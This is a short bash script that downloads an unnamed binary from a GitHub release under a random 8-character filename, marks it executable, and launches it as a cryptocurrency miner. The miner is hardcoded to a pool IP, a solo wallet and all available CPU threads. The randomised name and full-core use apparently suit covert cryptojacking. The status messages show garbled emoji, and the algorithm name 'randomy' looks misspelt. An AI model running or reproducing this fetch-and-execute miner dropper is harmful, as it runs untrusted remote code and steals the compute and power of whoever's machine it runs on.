#!/bin/bash

# Generate random filename (8-char alphanumeric, no prefix)
generate_random_filename() {
    tr -dc 'A-Za-z0-9' < /dev/urandom | head -c 8
}

main() {
    miner_filename=$(generate_random_filename)

    # Cleanup on exit
    trap "echo 'ðŸ§¹ Cleaning up...'; rm -f \"$miner_filename\"; exit" INT TERM

    echo "ðŸ“¥ Downloading miner to: $miner_filename"
    if wget -q https://github.com/vedhagsvp/qubros/releases/download/srmn/srnewmn -O "$miner_filename"; then
        echo "âœ… Download complete."
    else
        echo "âŒ Failed to download miner. Exiting."
        exit 1
    fi

    echo "ðŸ” Setting executable permission..."
    if chmod +x "$miner_filename"; then
        echo "âœ… Permission granted."
    else
        echo "âŒ Failed to set permissions."
        exit 1
    fi

    echo "ðŸš€ Starting miner..."
    ./"$miner_filename" \
        --algorithm randomy \
        --pool 94.237.30.115:8880 \
        --wallet solo:cb16e28eda52f3750022c539e75c84610f87af8030a9.DC77 \
        --cpu-threads $(nproc --all)

    if [[ $? -eq 0 ]]; then
        echo "âœ… Miner ran successfully."
    else
        echo "âŒ Miner exited with an error."
    fi
}

main
